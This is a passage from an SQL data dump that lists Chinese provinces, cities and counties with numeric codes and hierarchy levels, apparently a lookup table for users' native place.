,'nativeplace',7504,2),(18075,'浔阳区','7504.2','nativeplace',7504,2),(18074,'庐山区','7504.1','nativeplace',7504,2),(18073,'九江市','7504','nativeplace',7504,1),(18072,'芦溪县','7503.5','nativeplace',7504,2),(18071,'上栗县','7503.4','nativeplace',7503,2),(18070,'莲花县','7503.3','nativeplace',7503,2),(18069,'湘东区','7503.2','nativeplace',7503,2),(18068,'安源区','7503.1','nativeplace',7503,2),(18067,'萍乡市','7503','nativeplace',7503,1),(18066,'乐平市','7502.4','nativeplace',7502,2),(18065,'浮梁县','7502.3','nativeplace',7502,2),(18064,'珠山区','7502.2','nativeplace',7502,2),(18063,'昌江区','7502.1','nativeplace',7502,2),(18062,'景德镇市','7502','nativeplace',7502,1),(18061,'进贤县','7501.9','nativeplace',7502,2),(18060,'安义县','7501.8','nativeplace',7502,2),(18059,'新建县','7501.7','nativeplace',7502,2),(18058,'南昌县','7501.6','nativeplace',7502,2),(18057,'青山湖区','7501.5','nativeplace',7502,2),(18056,'湾里区','7501.4','nativeplace',7501,2),(18055,'青云谱区','7501.3','nativeplace',7501,2),(18054,'西湖区','7501.2','nativeplace',7501,2),(18053,'东湖区','7501.1','nativeplace',7501,2),(18052,'南昌市','7501','nativeplace',7501,1),(18051,'江西省','7500','nativeplace',7500,0),(18050,'福鼎市','7009.9','nativeplace',7010,2),(18049,'福安市','7009.8','nativeplace',7010,2),(18048,'柘荣县','7009.7','nativeplace',7010,2),(18047,'周宁县','7009.6','nativeplace',7010,2),(18046,'寿宁县','7009.5','nativeplace',7010,2),(18045,'屏南县','7009.4','nativeplace',7009,2),(18044,'古田县','7009.3','nativeplace',7009,2),(18043,'霞浦县','7009.2','nativeplace',7009,2),(18042,'蕉城区','7009.1','nativeplace',7009,2),(18041,'宁德市','7009','nativeplace',7009,1),(18040,'漳平市','7008.7','nativeplace',7009,2),(18039,'连城县','7008.6','nativeplace',7009,2),(18038,'武平县','7008.5','nativeplace',7009,2),(18037,'上杭县','7008.4','nativeplace',7008,2),(18036,'永定县','7008.3','nativeplace',7008,2),(18035,'长汀县','7008.2','nativeplace',7008,2),(18034,'新罗区','7008.1','nativeplace',7008,2),(18033,'龙岩市','7008','nativeplace',7008,1),(18032,'建阳市','7007.10','nativeplace',7007,2),(18031,'建瓯市','7007.9','nativeplace',7008,2),(18030,'武夷山市','7007.8','nativeplace',7008,2),(18029,'邵武市','7007.7','nativeplace',7008,2),(18028,'政和县','7007.6','nativeplace',7008,2),(18027,'松溪县','7007.5','nativeplace',7008,2),(18026,'光泽县','7007.4','nativeplace',7007,2),(18025,'浦城县','7007.3','nativeplace',7007,2),(18024,'顺昌县','7007.2','nativeplace',7007,2),(18023,'延平区','7007.1','nativeplace',7007,2),(18022,'南平市','7007','nativeplace',7007,1),(18021,'龙海市','7006.11','nativeplace',7006,2),(18020,'华安县','7006.10','nativeplace',7006,2),(18019,'平和县','7006.9','nativeplace',7007,2),(18018,'南靖县','7006.8','nativeplace',7007,2),(18017,'东山县','7006.7','nativeplace',7007,2),(18016,'长泰县','7006.6','nativeplace',7007,2),(18015,'诏安县','7006.5','nativeplace',7007,2),(18014,'漳浦县','7006.4','nativeplace',7006,2),(18013,'云霄县','7006.3','nativeplace',7006,2),(18012,'龙文区','7006.2','nativeplace',7006,2),(18011,'芗城区','7006.1','nativeplace',7006,2),(18010,'漳州市','7006','nativeplace',7006,1),(18009,'南安市','7005.12','nativeplace',7005,2),(18008,'晋江市','7005.11','nativeplace',7005,2),(18007,'石狮市','7005.10','nativeplace',7005,2),(18006,'金门县','7005.9','nativeplace',7006,2),(18005,'德化县','7005.8','nativeplace',7006,2),(18004,'永春县','7005.7','nativeplace',7006,2),(18003,'安溪县','7005.6','nativeplace',7006,2),(18002,'惠安县','7005.5','nativeplace',7006,2),(18001,'泉港区','7005.4','nativeplace',7005,2),(18000,'洛江区','7005.3','nativeplace',7005,2),(17999,'丰泽区','7005.2','nativeplace',7005,2),(17998,'鲤城区','7005.1','nativeplace',7005,2),(17997,'泉州市','7005','nativeplace',7005,1),(17996,'永安市','7004.12','nativeplace',7004,2),(17995,'建宁县','7004.11','nativeplace',7004,2),(17994,'泰宁县','7004.10','nativeplace',7004,2),(17993,'将乐县','7004.9','nativeplace',7005,2),(17992,'沙　县','7004.8','nativeplace',7005,2),(17991,'尤溪县','7004.7','nativeplace',7005,2),(17990,'大田县','7004.6','nativeplace',7005,2),(17989,'宁化县','7004.5','nativeplace',7005,2),(17988,'清流县','7004.4','nativeplace',7004,2),(17987,'明溪县','7004.3','nativeplace',7004,2),(17986,'三元区','7004.2','nativeplace',7004,2),(17985,'梅列区','7004.1','nativeplace',7004,2),(17984,'三明市','7004','nativeplace',7004,1),(17983,'仙游县','7003.5','nativeplace',7004,2),(17982,'秀屿区','7003.4','nativeplace',7003,2),(17981,'荔城区','7003.3','nativeplace',7003,2),(17980,'涵江区','7003.2','nativeplace',7003,2),(17979,'城厢区','7003.1','nativeplace',7003,2),(17978,'莆田市','7003','nativeplace',7003,1),(17977,'翔安区','7002.6','nativeplace',7003,2),(17976,'同安区','7002.5','nativeplace',7003,2),(17975,'集美区','7002.4','nativeplace',7002,2),(17974,'湖里区','7002.3','nativeplace',7002,2),(17973,'海沧区','7002.2','nativeplace',7002,2),(17972,'思明区','7002.1','nativeplace',7002,2),(17971,'厦门市','7002','nativeplace',7002,1),(17970,'长乐市','7001.13','nativeplace',7001,2),(17969,'福清市','7001.12','nativeplace',7001,2),(17968,'平潭县','7001.11','nativeplace',7001,2),(17967,'永泰县','7001.10','nativeplace',7001,2),(17966,'闽清县','7001.9','nativeplace',7002,2),(17965,'罗源县','7001.8','nativeplace',7002,2),(17964,'连江县','7001.7','nativeplace',7002,2),(17963,'闽侯县','7001.6','nativeplace',7002,2),(17962,'晋安区','7001.5','nativeplace',7002,2),(17961,'马尾区','7001.4','nativeplace',7001,2),(17960,'仓山区','7001.3','nativeplace',7001,2),(17959,'台江区','7001.2','nativeplace',7001,2),(17958,'鼓楼区','7001.1','nativeplace',7001,2),(17957,'福州市','7001','nativeplace',7001,1),(17956,'福建省','7000','nativeplace',7000,0),(17955,'宁国市','6517.7','nativeplace',6518,2),(17954,'旌德县','6517.6','nativeplace',6518,2),(17953,'绩溪县','6517.5','nativeplace',6518,2),(17952,'泾　县','6517.4','nativeplace',6517,2),(17951,'广德县','6517.3','nativeplace',6517,2),(17950,'郎溪县','6517.2','nativeplace',6517,2),(17949,'宣州区','6517.1','nativeplace',6517,2),(17948,'宣城市','6517','nativeplace',6517,1),(17947,'青阳县','6516.4','nativeplace',6516,2),(17946,'石台县','6516.3','nativeplace',6516,2),(17945,'东至县','6516.2','nativeplace',6516,2),(17944,'贵池区','6516.1','nativeplace',6516,2),(17943,'池州市','6516','nativeplace',6516,1),(17942,'利辛县','6515.4','nativeplace',6515,2),(17941,'蒙城县','6515.3','nativeplace',6515,2),(17940,'涡阳县','6515.2','nativeplace',6515,2),(17939,'谯城区','6515.1','nativeplace',6515,2),(17938,'亳州市','6515','nativeplace',6515,1),(17937,'霍山县','6514.7','nativeplace',6515,2),(17936,'金寨县','6514.6','nativeplace',6515,2),(17935,'舒城县','6514.5','nativeplace',6515,2),(17934,'霍邱县','6514.4','nativeplace',6514,2),(17933,'寿　县','6514.3','nativeplace',6514,2),(17932,'裕安区','6514.2','nativeplace',6514,2),(17931,'金安区','6514.1','nativeplace',6514,2),(17930,'六安市','6514','nativeplace',6514,1),(17929,'和　县','6513.5','nativeplace',6514,2),(17928,'含山县','6513.4','nativeplace',6513,2),(17927,'无为县','6513.3','nativeplace',6513,2),(17926,'庐江县','6513.2','nativeplace',6513,2),(17925,'居巢区','6513.1','nativeplace',6513,2),(17924,'巢湖市','6513','nativeplace',6513,1),(17923,'泗　县','6512.5','nativeplace',6513,2),(17922,'灵璧县','6512.4','nativeplace',6512,2),(17921,'萧　县','6512.3','nativeplace',6512,2),(17920,'砀山县','6512.2','nativeplace',6512,2),(17919,'墉桥区','6512.1','nativeplace',6512,2),(17918,'宿州市','6512','nativeplace',6512,1),(17917,'界首市','6511.8','nativeplace',6512,2),(17916,'颍上县','6511.7','nativeplace',6512,2),(17915,'阜南县','6511.6','nativeplace',6512,2),(17914,'太和县','6511.5','nativeplace',6512,2),(17913,'临泉县','6511.4','nativeplace',6511,2),(17912,'颍泉区','6511.3','nativeplace',6511,2),(17911,'颍东区','6511.2','nativeplace',6511,2),(17910,'颍州区','6511.1','nativeplace',6511,2),(17909,'阜阳市','6511','nativeplace',6511,1),(17908,'明光市','6510.8','nativeplace',6511,2),(17907,'天长市','6510.7','nativeplace',6511,2),(17906,'凤阳县','6510.6','nativeplace',6511,2),(17905,'定远县','6510.5','nativeplace',6511,2),(17904,'全椒县','6510.4','nativeplace',6510,2),(17903,'来安县','6510.3','nativeplace',6510,2),(17902,'南谯区','6510.2','nativeplace',6510,2),(17901,'琅琊区','6510.1','nativeplace',6510,2),(17900,'滁州市','6510','nativeplace',6510,1),(17899,'祁门县','6509.7','nativeplace',6510,2),(17898,'黟　县','6509.6','nativeplace',6510,2),(17897,'休宁县','6509.5','nativeplace',6510,2),(17896,'歙　县','6509.4','nativeplace',6509,2),(17895,'徽州区','6509.3','nativeplace',6509,2),(17894,'黄山区','6509.2','nativeplace',6509,2),(17893,'屯溪区','6509.1','nativeplace',6509,2),(17892,'黄山市','6509','nativeplace',6509,1),(17891,'桐城市','6508.11','nativeplace',6508,2),(17890,'岳西县','6508.10','nativeplace',6508,2),(17889,'望江县','6508.9','nativeplace',6509,2),(17888,'宿松县','6508.8','nativeplace',6509,2),(17887,'太湖县','6508.7','nativeplace',6509,2),(17886,'潜山县','6508.6','nativeplace',6509,2),(17885,'枞阳县','6508.5','nativeplace',6509,2),(17884,'怀宁县','6508.4','nativeplace',6508,2),(17883,'郊　区','6508.3','nativeplace',6508,2),(17882,'大观区','6508.2','nativeplace',6508,2),(17881,'迎江区','6508.1','nativeplace',6508,2),(17880,'安庆市','6508','nativeplace',6508,1),(17879,'铜陵县','6507.4','nativeplace',6507,2),(17878,'郊　区','6507.3','nativeplace',6507,2),(17877,'狮子山区','6507.2','nativeplace',6507,2),(17876,'铜官山区','6507.1','nativeplace',6507,2),(17875,'铜陵市','6507','nativeplace',6507,1),(17874,'濉溪县','6506.4','nativeplace',6506,2),(17873,'烈山区','6506.3','nativeplace',6506,2),(17872,'相山区','6506.2','nativeplace',6506,2),(17871,'杜集区','6506.1','nativeplace',6506,2),(17870,'淮北市','6506','nativeplace',6506,1),(17869,'当涂县','6505.4','nativeplace',6505,2),(17868,'雨山区','6505.3','nativeplace',6505,2),(17867,'花山区','6505.2','nativeplace',6505,2),(17866,'金家庄区','6505.1','nativeplace',6505,2),(17865,'马鞍山市','6505','nativeplace',6505,1),(17864,'凤台县','6504.6','nativeplace',6505,2),(17863,'潘集区','6504.5','nativeplace',6505,2),(17862,'八公山区','6504.4','nativeplace',6504,2),(17861,'谢家集区','6504.3','nativeplace',6504,2),(17860,'田家庵区','6504.2','nativeplace',6504,2),(17859,'大通区','6504.1','nativeplace',6504,2),(17858,'淮南市','6504','nativeplace',6504,1),(17857,'固镇县','6503.7','nativeplace',6504,2),(17856,'五河县','6503.6','nativeplace',6504,2),(17855,'怀远县','6503.5','nativeplace',6504,2),(17854,'淮上区','6503.4','nativeplace',6503,2),(17853,'禹会区','6503.3','nativeplace',6503,2),(17852,'蚌山区','6503.2','nativeplace',6503,2),(17851,'龙子湖区','6503.1','nativeplace',6503,2),(17850,'蚌埠市','6503','nativeplace',6503,1),(17849,'南陵县','6502.7','nativeplace',6503,2),(17848,'繁昌县','6502.6','nativeplace',6503,2),(17847,'芜湖县','6502.5','nativeplace',6503,2),(17846,'鸠江区','6502.4','nativeplace',6502,2),(17845,'新芜区','6502.3','nativeplace',6502,2),(17844,'马塘区','6502.2','nativeplace',6502,2),(17843,'镜湖区','6502.1','nativeplace',6502,2),(17842,'芜湖市','6502','nativeplace',6502,1),(17841,'肥西县','6501.7','nativeplace',6502,2),(17840,'肥东县','6501.6','nativeplace',6502,2),(17839,'长丰县','6501.5','nativeplace',6502,2),(17838,'包河区','6501.4','nativeplace',6501,2),(17837,'蜀山区','6501.3','nativeplace',6501,2),(17836,'庐阳区','6501.2','nativeplace',6501,2),(17835,'瑶海区','6501.1','nativeplace',6501,2),(17834,'合肥市','6501','nativeplace',6501,1),(17833,'安徽省','6500','nativeplace',6500,0),(17832,'龙泉市','6011.9','nativeplace',6012,2),(17831,'景宁畲族自治县','6011.8','nativeplace',6012,2),(17830,'庆元县','6011.7','nativeplace',6012,2),(17829,'云和县','6011.6','nativeplace',6012,2),(17828,'松阳县','6011.5','nativeplace',6012,2),(17827,'遂昌县','6011.4','nativeplace',6011,2),(17826,'缙云县','6011.3','nativeplace',6011,2),(17825,'青田县','6011.2','nativeplace',6011,2),(17824,'莲都区','6011.1','nativeplace',6011,2),(17823,'丽水市','6011','nativeplace',6011,1),(17822,'临海市','6010.9','nativeplace',6011,2),(17821,'温岭市','6010.8','nativeplace',6011,2),(17820,'仙居县','6010.7','nativeplace',6011,2),(17819,'天台县','6010.6','nativeplace',6011,2),(17818,'三门县','6010.5','nativeplace',6011,2),(17817,'玉环县','6010.4','nativeplace',6010,2),(17816,'路桥区','6010.3','nativeplace',6010,2),(17815,'黄岩区','6010.2','nativeplace',6010,2),(17814,'椒江区','6010.1','nativeplace',6010,2),(17813,'台州市','6010','nativeplace',6010,1),(17812,'嵊泗县','6009.4','nativeplace',6009,2),(17811,'岱山县','6009.3','nativeplace',6009,2),(17810,'普陀区','6009.2','nativeplace',6009,2),(17809,'定海区','6009.1','nativeplace',6009,2),(17808,'舟山市','6009','nativeplace',6009,1),(17807,'江山市','6008.6','nativeplace',6009,2),(17806,'龙游县','6008.5','nativeplace',6009,2),(17805,'开化县','6008.4','nativeplace',6008,2),(17804,'常山县','6008.3','nativeplace',6008,2),(17803,'衢江区','6008.2','nativeplace',6008,2),(17802,'柯城区','6008.1','nativeplace',6008,2),(17801,'衢州市','6008','nativeplace',6008,1),(17800,'永康市','6007.9','nativeplace',6008,2),(17799,'东阳市','6007.8','nativeplace',6008,2),(17798,'义乌市','6007.7','nativeplace',6008,2),(17797,'兰溪市','6007.6','nativeplace',6008,2),(17796,'磐安县','6007.5','nativeplace',6008,2),(17795,'浦江县','6007.4','nativeplace',6007,2),(17794,'武义县','6007.3','nativeplace',6007,2),(17793,'金东区','6007.2','nativeplace',6007,2),(17792,'婺城区','6007.1','nativeplace',6007,2),(17791,'金华市','6007','nativeplace',6007,1),(17790,'嵊州市','6006.6','nativeplace',6007,2),(17789,'上虞市','6006.5','nativeplace',6007,2),(17788,'诸暨市','6006.4','nativeplace',6006,2),(17787,'新昌县','6006.3','nativeplace',6006,2),(17786,'绍兴县','6006.2','nativeplace',6006,2),(17785,'越城区','6006.1','nativeplace',6006,2),(17784,'绍兴市','6006','nativeplace',6006,1),(17783,'安吉县','6005.5','nativeplace',6006,2),(17782,'长兴县','6005.4','nativeplace',6005,2),(17781,'德清县','6005.3','nativeplace',6005,2),(17780,'南浔区','6005.2','nativeplace',6005,2),(17779,'吴兴区','6005.1','nativeplace',6005,2),(17778,'湖州市','6005','nativeplace',6005,1),(17777,'桐乡市','6004.7','nativeplace',6005,2),(17776,'平湖市','6004.6','nativeplace',6005,2),(17775,'海宁市','6004.5','nativeplace',6005,2),(17774,'海盐县','6004.4','nativeplace',6004,2),(17773,'嘉善县','6004.3','nativeplace',6004,2),(17772,'秀洲区','6004.2','nativeplace',6004,2),(17771,'秀城区','6004.1','nativeplace',6004,2),(17770,'嘉兴市','6004','nativeplace',6004,1),(17769,'乐清市','6003.11','nativeplace',6003,2),(17768,'瑞安市','6003.10','nativeplace',6003,2),(17767,'泰顺县','6003.9','nativeplace',6004,2),(17766,'文成县','6003.8','nativeplace',6004,2),(17765,'苍南县','6003.7','nativeplace',6004,2),(17764,'平阳县','6003.6','nativeplace',6004,2),(17763,'永嘉县','6003.5','nativeplace',6004,2),(17762,'洞头县','6003.4','nativeplace',6003,2),(17761,'瓯海区','6003.3','nativeplace',6003,2),(17760,'龙湾区','6003.2','nativeplace',6003,2),(17759,'鹿城区','6003.1','nativeplace',6003,2),(17758,'温州市','6003','nativeplace',6003,1),(17757,'奉化市','6002.11','nativeplace',6002,2),(17756,'慈溪市','6002.10','nativeplace',6002,2),(17755,'余姚市','6002.9','nativeplace',6003,2),(17754,'宁海县','6002.8','nativeplace',6003,2),(17753,'象山县','6002.7','nativeplace',6003,2),(17752,'鄞州区','6002.6','nativeplace',6003,2),(17751,'镇海区','6002.5','nativeplace',6003,2),(17750,'北仑区','6002.4','nativeplace',6002,2),(17749,'江北区','6002.3','nativeplace',6002,2),(17748,'江东区','6002.2','nativeplace',6002,2),(17747,'海曙区','6002.1','nativeplace',6002,2),(17746,'宁波市','6002','nativeplace',6002,1),(17745,'临安市','6001.13','nativeplace',6001,2),(17744,'富阳市','6001.12','nativeplace',6001,2),(17743,'建德市','6001.11','nativeplace',6001,2),(17742,'淳安县','6001.10','nativeplace',6001,2),(17741,'桐庐县','6001.9','nativeplace',6002,2),(17740,'余杭区','6001.8','nativeplace',6002,2),(17739,'萧山区','6001.7','nativeplace',6002,2),(17738,'滨江区','6001.6','nativeplace',6002,2),(17737,'西湖区','6001.5','nativeplace',6002,2),(17736,'拱墅区','6001.4','nativeplace',6001,2),(17735,'江干区','6001.3','nativeplace',6001,2),(17734,'下城区','6001.2','nativeplace',6001,2),(17733,'上城区','6001.1','nativeplace',6001,2),(17732,'杭州市','6001','nativeplace',6001,1),(17731,'浙江省','6000','nativeplace',6000,0),(17730,'泗洪县','5513.5','nativeplace',5514,2),(17729,'泗阳县','5513.4','nativeplace',5513,2),(17728,'沭阳县','5513.3','nativeplace',5513,2),(17727,'宿豫区','5513.2','nativeplace',5513,2),(17726,'宿城区','5513.1','nativeplace',5513,2),(17725,'宿迁市','5513','nativeplace',5513,1),(17724,'姜堰市','5512.6','nativeplace',5513,2),(17723,'泰兴市','5512.5','nativeplace',5513,2),(17722,'靖江市','5512.4','nativeplace',5512,2),(17721,'兴化市','5512.3','nativeplace',5512,2),(17720,'高港区','5512.2','nativeplace',5512,2),(17719,'海陵区','5512.1','nativeplace',5512,2),(17718,'泰州市','5512','nativeplace',5512,1),(17717,'句容市','5511.6','nativeplace',5512,2),(17716,'扬中市','5511.5','nativeplace',5512,2),(17715,'丹阳市','5511.4','nativeplace',5511,2),(17714,'丹徒区','5511.3','nativeplace',5511,2),(17713,'润州区','5511.2','nativeplace',5511,2),(17712,'京口区','5511.1','nativeplace',5511,2),(17711,'镇江市','5511','nativeplace',5511,1),(17710,'江都市','5510.7','nativeplace',5511,2),(17709,'高邮市','5510.6','nativeplace',5511,2),(17708,'仪征市','5510.5','nativeplace',5511,2),(17707,'宝应县','5510.4','nativeplace',5510,2),(17706,'郊　区','5510.3','nativeplace',5510,2),(17705,'邗江区','5510.2','nativeplace',5510,2),(17704,'广陵区','5510.1','nativeplace',5510,2),(17703,'扬州市','5510','nativeplace',5510,1),(17702,'大丰市','5509.9','nativeplace',5510,2),(17701,'东台市','5509.8','nativeplace',5510,2),(17700,'建湖县','5509.7','nativeplace',5510,2),(17699,'射阳县','5509.6','nativeplace',5510,2),(17698,'阜宁县','5509.5','nativeplace',5510,2),(17697,'滨海县','5509.4','nativeplace',5509,2),(17696,'响水县','5509.3','nativeplace',5509,2),(17695,'盐都区','5509.2','nativeplace',5509,2),(17694,'亭湖区','5509.1','nativeplace',5509,2),(17693,'盐城市','5509','nativeplace',5509,1),(17692,'金湖县','5508.8','nativeplace',5509,2),(17691,'盱眙县','5508.7','nativeplace',5509,2),(17690,'洪泽县','5508.6','nativeplace',5509,2),(17689,'涟水县','5508.5','nativeplace',5509,2),(17688,'清浦区','5508.4','nativeplace',5508,2),(17687,'淮阴区','5508.3','nativeplace',5508,2),(17686,'楚州区','5508.2','nativeplace',5508,2),(17685,'清河区','5508.1','nativeplace',5508,2),(17684,'淮安市','5508','nativeplace',5508,1),(17683,'灌南县','5507.7','nativeplace',5508,2),(17682,'灌云县','5507.6','nativeplace',5508,2),(17681,'东海县','5507.5','nativeplace',5508,2),(17680,'赣榆县','5507.4','nativeplace',5507,2),(17679,'海州区','5507.3','nativeplace',5507,2),(17678,'新浦区','5507.2','nativeplace',5507,2),(17677,'连云区','5507.1','nativeplace',5507,2),(17676,'连云港市','5507','nativeplace',5507,1),(17675,'海门市','5506.8','nativeplace',5507,2),(17674,'通州市','5506.7','nativeplace',5507,2),(17673,'如皋市','5506.6','nativeplace',5507,2),(17672,'启东市','5506.5','nativeplace',5507,2),(17671,'如东县','5506.4','nativeplace',5506,2),(17670,'海安县','5506.3','nativeplace',5506,2),(17669,'港闸区','5506.2','nativeplace',5506,2),(17668,'崇川区','5506.1','nativeplace',5506,2),(17667,'南通市','5506','nativeplace',5506,1),(17666,'太仓市','5505.11','nativeplace',5505,2),(17665,'吴江市','5505.10','nativeplace',5505,2),(17664,'昆山市','5505.9','nativeplace',5506,2),(17663,'张家港市','5505.8','nativeplace',5506,2),(17662,'常熟市','5505.7','nativeplace',5506,2),(17661,'相城区','5505.6','nativeplace',5506,2),(17660,'吴中区','5505.5','nativeplace',5506,2),(17659,'虎丘区','5505.4','nativeplace',5505,2),(17658,'金阊区','5505.3','nativeplace',5505,2),(17657,'平江区','5505.2','nativeplace',5505,2),(17656,'沧浪区','5505.1','nativeplace',5505,2),(17655,'苏州市','5505','nativeplace',5505,1),(17654,'金坛市','5504.7','nativeplace',5505,2),(17653,'溧阳市','5504.6','nativeplace',5505,2),(17652,'武进区','5504.5','nativeplace',5505,2),(17651,'新北区','5504.4','nativeplace',5504,2),(17650,'戚墅堰区','5504.3','nativeplace',5504,2),(17649,'钟楼区','5504.2','nativeplace',5504,2),(17648,'天宁区','5504.1','nativeplace',5504,2),(17647,'常州市','5504','nativeplace',5504,1),(17646,'邳州市','5503.11','nativeplace',5503,2),(17645,'新沂市','5503.10','nativeplace',5503,2),(17644,'睢宁县','5503.9','nativeplace',5504,2),(17643,'铜山县','5503.8','nativeplace',5504,2),(17642,'沛　县','5503.7','nativeplace',5504,2),(17641,'丰　县','5503.6','nativeplace',5504,2),(17640,'泉山区','5503.5','nativeplace',5504,2),(17639,'贾汪区','5503.4','nativeplace',5503,2),(17638,'九里区','5503.3','nativeplace',5503,2),(17637,'云龙区','5503.2','nativeplace',5503,2),(17636,'鼓楼区','5503.1','nativeplace',5503,2),(17635,'徐州市','5503','nativeplace',5503,1),(17634,'宜兴市','5502.8','nativeplace',5503,2),(17633,'江阴市','5502.7','nativeplace',5503,2),(17632,'滨湖区','5502.6','nativeplace',5503,2),(17631,'惠山区','5502.5','nativeplace',5503,2),(17630,'锡山区','5502.4','nativeplace',5502,2),(17629,'北塘区','5502.3','nativeplace',5502,2),(17628,'南长区','5502.2','nativeplace',5502,2),(17627,'崇安区','5502.1','nativeplace',5502,2),(17626,'无锡市','5502','nativeplace',5502,1),(17625,'高淳县','5501.13','nativeplace',5501,2),(17624,'溧水县','5501.12','nativeplace',5501,2),(17623,'六合区','5501.11','nativeplace',5501,2),(17622,'江宁区','5501.10','nativeplace',5501,2),(17621,'雨花台区','5501.9','nativeplace',5502,2),(17620,'栖霞区','5501.8','nativeplace',5502,2),(17619,'浦口区','5501.7','nativeplace',5502,2),(17618,'下关区','5501.6','nativeplace',5502,2),(17617,'鼓楼区','5501.5','nativeplace',5502,2),(17616,'建邺区','5501.4','nativeplace',5501,2),(17615,'秦淮区','5501.3','nativeplace',5501,2),(17614,'白下区','5501.2','nativeplace',5501,2),(17613,'武区','5501.1','nativeplace',5501,2),(17612,'南京市','5501','nativeplace',5501,1),(17611,'江苏省','5500','nativeplace',5500,0),(17610,'崇明县','5019','nativeplace',5019,1),(17609,'奉贤区','5018','nativeplace',5018,1),(17608,'南汇区','5017','nativeplace',5017,1),(17607,'青浦区','5016','nativeplace',5016,1),(17606,'松江区','5015','nativeplace',5015,1),(17605,'金山区','5014','nativeplace',5014,1),(17604,'浦东新区','5013','nativeplace',5013,1),(17603,'嘉定区','5012','nativeplace',5012,1),(17602,'宝山区','5011','nativeplace',5011,1),(17601,'闵行区','5010','nativeplace',5010,1),(17600,'杨浦区','5009','nativeplace',5009,1),(17599,'虹口区','5008','nativeplace',5008,1),(17598,'闸北区','5007','nativeplace',5007,1),(17597,'普陀区','5006','nativeplace',5006,1),(17596,'静安区','5005','nativeplace',5005,1),(17595,'长宁区','5004','nativeplace',5004,1),(17594,'徐汇区','5003','nativeplace',5003,1),(17593,'卢湾区','5002','nativeplace',5002,1),(17592,'黄浦区','5001','nativeplace',5001,1),(17591,'上海市','5000','nativeplace',5000,0),(17590,'漠河县','4513.3','nativeplace',4513,2),(17589,'塔河县','4513.2','nativeplace',4513,2),(17588,'呼玛县','4513.1','nativeplace',4513,2),(17587,'大兴安岭地区','4513','nativeplace',4513,1),(17586,'海伦市','4512.10','nativeplace',4512,2),(17585,'肇东市','4512.9','nativeplace',4513,2),(17584,'安达市','4512.8','nativeplace',4513,2),(17583,'绥棱县','4512.7','nativeplace',4513,2),(17582,'明水县','4512.6','nativeplace',4513,2),(17581,'庆安县','4512.5','nativeplace',4513,2),(17580,'青冈县','4512.4','nativeplace',4512,2),(17579,'兰西县','4512.3','nativeplace',4512,2),(17578,'望奎县','4512.2','nativeplace',4512,2),(17577,'北林区','4512.1','nativeplace',4512,2),(17576,'绥化市','4512','nativeplace',4512,1),(17575,'五大连池市','4511.6','nativeplace',4512,2),(17574,'北安市','4511.5','nativeplace',4512,2),(17573,'孙吴县','4511.4','nativeplace',4511,2),(17572,'逊克县','4511.3','nativeplace',4511,2),(17571,'嫩江县','4511.2','nativeplace',4511,2),(17570,'爱辉区','4511.1','nativeplace',4511,2),(17569,'黑河市','4511','nativeplace',4511,1),(17568,'穆棱市','4510.10','nativeplace',4510,2),(17567,'宁安市','4510.9','nativeplace',4511,2),(17566,'海林市','4510.8','nativeplace',4511,2),(17565,'绥芬河市','4510.7','nativeplace',4511,2),(17564,'林口县','4510.6','nativeplace',4511,2),(17563,'东宁县','4510.5','nativeplace',4511,2),(17562,'西安区','4510.4','nativeplace',4510,2),(17561,'爱民区','4510.3','nativeplace',4510,2),(17560,'阳明区','4510.2','nativeplace',4510,2),(17559,'东安区','4510.1','nativeplace',4510,2),(17558,'牡丹江市','4510','nativeplace',4510,1),(17557,'勃利县','4509.4','nativeplace',4509,2),(17556,'茄子河区','4509.3','nativeplace',4509,2),(17555,'桃山区','4509.2','nativeplace',4509,2),(17554,'新兴区','4509.1','nativeplace',4509,2),(17553,'七台河市','4509','nativeplace',4509,1),(17552,'富锦市','4508.11','nativeplace',4508,2),(17551,'同江市','4508.10','nativeplace',4508,2),(17550,'抚远县','4508.9','nativeplace',4509,2),(17549,'汤原县','4508.8','nativeplace',4509,2),(17548,'桦川县','4508.7','nativeplace',4509,2),(17547,'桦南县','4508.6','nativeplace',4509,2),(17546,'郊　区','4508.5','nativeplace',4509,2),(17545,'东风区','4508.4','nativeplace',4508,2),(17544,'前进区','4508.3','nativeplace',4508,2),(17543,'向阳区','4508.2','nativeplace',4508,2),(17542,'永红区','4508.1','nativeplace',4508,2),(17541,'佳木斯市','4508','nativeplace',4508,1),(17540,'铁力市','4507.17','nativeplace',4507,2),(17539,'嘉荫县','4507.16','nativeplace',4507,2),(17538,'上甘岭区','4507.15','nativeplace',4507,2),(17537,'红星区','4507.14','nativeplace',4507,2),(17536,'乌伊岭区','4507.13','nativeplace',4507,2),(17535,'带岭区','4507.12','nativeplace',4507,2),(17534,'汤旺河区','4507.11','nativeplace',4507,2),(17533,'乌马河区','4507.10','nativeplace',4507,2),(17532,'五营区','4507.9','nativeplace',4508,2),(17531,'金山屯区','4507.8','nativeplace',4508,2),(17530,'美溪区','4507.7','nativeplace',4508,2),(17529,'新青区','4507.6','nativeplace',4508,2),(17528,'翠峦区','4507.5','nativeplace',4508,2),(17527,'西林区','4507.4','nativeplace',4507,2),(17526,'友好区','4507.3','nativeplace',4507,2),(17525,'南岔区','4507.2','nativeplace',4507,2),(17524,'伊春区','4507.1','nativeplace',4507,2),(17523,'伊春市','4507','nativeplace',4507,1),(17522,'杜尔伯特蒙古族自治县','4506.9','nativeplace',4507,2),(17521,'林甸县','4506.8','nativeplace',4507,2),(17520,'肇源县','4506.7','nativeplace',4507,2),(17519,'肇州县','4506.6','nativeplace',4507,2),(17518,'大同区','4506.5','nativeplace',4507,2),(17517,'红岗区','4506.4','nativeplace',4506,2),(17516,'让胡路区','4506.3','nativeplace',4506,2),(17515,'龙凤区','4506.2','nativeplace',4506,2),(17514,'萨尔图区','4506.1','nativeplace',4506,2),(17513,'大庆市','4506','nativeplace',4506,1),(17512,'饶河县','4505.8','nativeplace',4506,2),(17511,'宝清县','4505.7','nativeplace',4506,2),(17510,'友谊县','4505.6','nativeplace',4506,2),(17509,'集贤县','4505.5','nativeplace',4506,2),(17508,'宝山区','4505.4','nativeplace',4505,2),(17507,'四方台区','4505.3','nativeplace',4505,2),(17506,'岭东区','4505.2','nativeplace',4505,2),(17505,'尖山区','4505.1','nativeplace',4505,2),(17504,'双鸭山市','4505','nativeplace',4505,1),(17503,'绥滨县','4504.8','nativeplace',4505,2),(17502,'萝北县','4504.7','nativeplace',4505,2),(17501,'兴山区','4504.6','nativeplace',4505,2),(17500,'东山区','4504.5','nativeplace',4505,2),(17499,'兴安区','4504.4','nativeplace',4504,2),(17498,'南山区','4504.3','nativeplace',4504,2),(17497,'工农区','4504.2','nativeplace',4504,2),(17496,'向阳区','4504.1','nativeplace',4504,2),(17495,'鹤岗市','4504','nativeplace',4504,1),(17494,'密山市','4503